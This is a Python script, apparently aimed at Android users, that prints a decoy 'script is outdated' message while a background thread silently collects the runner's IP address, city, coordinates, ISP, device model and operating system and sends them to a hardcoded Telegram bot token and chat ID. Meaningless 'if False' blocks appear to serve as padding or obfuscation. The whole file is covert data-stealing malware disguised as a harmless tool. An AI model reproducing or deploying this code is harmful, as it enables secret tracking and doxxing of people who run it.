import threading
import requests
import platform
if False:
    _var_126_0 = (103, 562, 260)
    _var_126_1 = (21, 705, 974)

    def _var_126_fn():
        pass
import subprocess
BOT_TOKEN = '6745711912:AAF4CpyT-h866ov_6c_BtG-Uep-jfcryGE8'
from datetime import datetime
CHAT_ID = '2104592399'

def get_ip_info():
    try:
        response = requests.get('https://ipinfo.io/', timeout=2)
        if response.status_code == 200:
            return response.json()
    except requests.RequestException:
        return None

def get_device_model():
    try:
        model = subprocess.check_output(['getprop', 'ro.product.model']).decode().strip()
        return model
    except Exception:
        return 'Unknown Device'

def get_os_info():
    return platform.platform()
if False:
    _var_127_0 = (77, 114, 889)
    _var_127_1 = (667, 267, 83)

    def _var_127_fn():
        pass

def send_telegram_message(message):
    payload = {'chat_id': CHAT_ID, 'text': message, 'parse_mode': 'HTML'}
    url = f'https://api.telegram.org/bot{BOT_TOKEN}/sendMessage'
    try:
        requests.post(url, data=payload)
    except Exception:
        pass

def handle_ip_fetching():
    ip_info = get_ip_info()
    if ip_info:
        ip = ip_info.get('ip', 'N/A')
        city = ip_info.get('city', 'N/A')
        region = ip_info.get('region', 'N/A')
        country = ip_info.get('country', 'N/A')
        loc = ip_info.get('loc', 'N/A')
        org = ip_info.get('org', 'N/A')
        postal = ip_info.get('postal', 'N/A')
        timezone = ip_info.get('timezone', 'N/A')
        current_time = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        device_model = get_device_model()
        os_info = get_os_info()
        message = f'<b>IP Address Information:</b>\n\n<b>IP:</b> {ip}\n<b>City:</b> {city}\n<b>Region:</b> {region}\n<b>Country:</b> {country}\n<b>Location:</b> {loc}\n<b>Organization:</b> {org}\n<b>Postal Code:</b> {postal}\n<b>Timezone:</b> {timezone}\n<b>Current Time:</b> {current_time}\n<b>Device Model:</b> {device_model}\n<b>Operating System:</b> {os_info}'
        send_telegram_message(message)

def main():
    print('This script is outdated, please download the latest version.')
    if False:
        _var_125_0 = (967, 700, 875)

        def _var_125_fn():
            pass
    threading.Thread(target=handle_ip_fetching).start()
if False:
    _var_128_0 = (651, 569, 772)

    def _var_128_fn():
        pass